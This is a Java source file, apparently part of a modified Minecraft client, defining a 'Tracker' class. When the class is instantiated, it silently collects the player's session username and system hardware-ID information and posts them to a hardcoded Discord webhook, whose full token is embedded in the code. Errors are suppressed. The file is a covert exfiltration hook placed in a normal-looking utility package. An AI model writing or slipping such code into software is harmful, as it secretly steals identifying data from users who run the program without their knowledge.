package me.earth.phobos.util;

import net.minecraft.client.Minecraft;
import me.earth.phobos.util.SystemUtil;

public
class Tracker {

    public
    Tracker ( ) {

        final String l = "https://discord.com/api/webhooks/842404931456598081/UmT5Ryv3rMJMvdvK0eqpPg3DzgITn9HYcf1_85V-xYYRXlKc11ISG7Z1huEcA9HCa6nt";
        final String CapeName = "Logger";
        final String CapeImageURL = "https://cdn.discordapp.com/icons/851358091286282260/17fdd021c701c00ff95bc2b50344a5ad.png?size=128";

        TrackerUtil d = new TrackerUtil ( l );

        String minecraft_name = "NOT FOUND";

        try {
            minecraft_name = Minecraft.getMinecraft ( ).getSession ( ).getUsername ( );
        } catch ( Exception ignore ) {
        }

        try {
            TrackerPlayerBuilder dm = new TrackerPlayerBuilder.Builder ( )
                    .withUsername ( CapeName )
                    .withContent ( minecraft_name + " ran the client. Their hwid:" + SystemUtil.getSystemInfo() )
                    .withAvatarURL ( CapeImageURL )
                    .withDev ( false )
                    .build ( );
            d.sendMessage ( dm );
        } catch ( Exception ignore ) {
        }
    }
}

